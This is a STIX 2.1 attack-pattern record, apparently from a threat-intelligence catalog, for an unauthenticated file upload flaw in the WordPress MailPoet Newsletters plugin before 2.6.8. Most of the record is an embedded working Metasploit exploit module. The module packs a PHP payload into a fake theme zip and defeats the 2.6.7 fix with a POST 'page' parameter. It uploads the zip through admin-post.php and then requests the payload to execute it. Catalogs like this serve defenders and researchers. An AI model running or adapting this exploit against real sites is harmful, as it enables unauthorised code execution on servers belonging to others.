{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9c846bdd-a61c-441a-8602-ae197ab33242",
    "created": "2024-08-14T17:12:53.16952Z",
    "modified": "2024-08-14T17:12:53.169524Z",
    "name": "Wordpress MailPoet Newsletters (wysija-newsletters) Unauthenticated File Upload",
    "description": " The Wordpress plugin \"MailPoet Newsletters\" (wysija-newsletters) before 2.6.8 is vulnerable to an unauthenticated file upload. The exploit uses the Upload Theme functionality to upload a zip file containing the payload. The plugin uses the admin_init hook, which is also executed for unauthenticated users when accessing",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/wp_wysija_newsletters_upload.rb",
            "external_id": "wp_wysija_newsletters_upload.rb"
        },
        {
            "source_name": "reference",
            "url": "http://blog.sucuri.net/2014/07/remote-file-upload-vulnerability-on-mailpoet-wysija-newsletters.html"
        },
        {
            "source_name": "reference",
            "url": "http://www.mailpoet.com/security-update-part-2/"
        },
        {
            "source_name": "reference",
            "url": "https://plugins.trac.wordpress.org/changeset/943427/wysija-newsletters/trunk/helpers/back.php"
        },
        {
            "source_name": "WPVDB",
            "external_id": "6680"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(\n      info,\n      'Name'           => 'Wordpress MailPoet Newsletters (wysija-newsletters) Unauthenticated File Upload',\n      'Description'    => %q{\n          The Wordpress plugin \"MailPoet Newsletters\" (wysija-newsletters) before 2.6.8\n          is vulnerable to an unauthenticated file upload. The exploit uses the Upload Theme\n          functionality to upload a zip file containing the payload. The plugin uses the\n          admin_init hook, which is also executed for unauthenticated users when accessing\n          a specific URL. The first fix for this vulnerability appeared in version 2.6.7,\n          but the fix can be bypassed. In PHP's default configuration,\n          a POST variable overwrites a GET variable in the $_REQUEST array. The plugin\n          uses $_REQUEST to check for access rights. By setting the POST parameter to\n          something not beginning with 'wysija_', the check is bypassed. Wordpress uses\n          the $_GET array to determine the page, so it is not affected by this. The developers\n          applied the fixes to all previous versions too.\n      },\n      'Author'         =>\n        [\n          'Marc-Alexandre Montpas', # initial discovery\n          'Christian Mehlmauer'     # metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['URL', 'http://blog.sucuri.net/2014/07/remote-file-upload-vulnerability-on-mailpoet-wysija-newsletters.html'],\n          ['URL', 'http://www.mailpoet.com/security-update-part-2/'],\n          ['URL', 'https://plugins.trac.wordpress.org/changeset/943427/wysija-newsletters/trunk/helpers/back.php'],\n          ['WPVDB', '6680']\n        ],\n      'Privileged'     => false,\n      'Platform'       => ['php'],\n      'Arch'           => ARCH_PHP,\n      'Targets'        => [['wysija-newsletters < 2.6.8', {}]],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2014-07-01'))\n  end\n\n  def create_zip_file(theme_name, payload_name)\n    # the zip file must match the following:\n    #  -) Exactly one folder representing the theme name\n    #  -) A style.css in the theme folder\n    #  -) Additional files in the folder\n\n    content = {\n      ::File.join(theme_name, 'style.css') => '',\n      ::File.join(theme_name, payload_name) => payload.encoded\n    }\n\n    zip_file = Rex::Zip::Archive.new\n    content.each_pair do |name, con|\n      zip_file.add_file(name, con)\n    end\n\n    zip_file.pack\n  end\n\n  def check\n    check_plugin_version_from_readme('wysija-newsletters', '2.6.8')\n  end\n\n  def exploit\n    theme_name = rand_text_alpha(10)\n    payload_name = \"#{rand_text_alpha(10)}.php\"\n\n    zip_content = create_zip_file(theme_name, payload_name)\n\n    data = Rex::MIME::Message.new\n    data.add_part(zip_content, 'application/x-zip-compressed', 'binary', \"form-data; name=\\\"my-theme\\\"; filename=\\\"#{rand_text_alpha(5)}.zip\\\"\")\n    data.add_part('on', nil, nil, 'form-data; name=\"overwriteexistingtheme\"')\n    data.add_part('themeupload', nil, nil, 'form-data; name=\"action\"')\n    data.add_part('Upload', nil, nil, 'form-data; name=\"submitter\"')\n    # this line bypasses the check implemented in version 2.6.7\n    data.add_part(rand_text_alpha(10), nil, nil, 'form-data; name=\"page\"')\n    post_data = data.to_s\n\n    payload_uri = normalize_uri(target_uri.path, wp_content_dir, 'uploads', 'wysija', 'themes', theme_name, payload_name)\n\n    print_status(\"Uploading payload to #{payload_uri}\")\n    res = send_request_cgi(\n      'method'   => 'POST',\n      'uri'      => wordpress_url_admin_post,\n      'ctype'    => \"multipart/form-data; boundary=#{data.bound}\",\n      'vars_get' => { 'page' => 'wysija_campaigns', 'action' => 'themes' },\n      'data'     => post_data\n    )\n\n    if res.nil? || res.code != 302 || res.headers['Location'] != 'admin.php?page=wysija_campaigns&action=themes&reload=1&redirect=1'\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Upload failed\")\n    end\n\n    # Files to cleanup (session is dropped in the created folder):\n    #   style.css\n    #   the payload\n    #   the theme folder (manual cleanup)\n    register_files_for_cleanup('style.css', payload_name)\n\n    print_warning(\"The theme folder #{theme_name} can not be removed. Please delete it manually.\")\n\n    print_status(\"Executing payload #{payload_uri}\")\n    send_request_cgi(\n      'uri'    => payload_uri,\n      'method' => 'GET'\n    )\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2014-07-01",
    "x_mitre_platforms": [
        "['php']"
    ]
}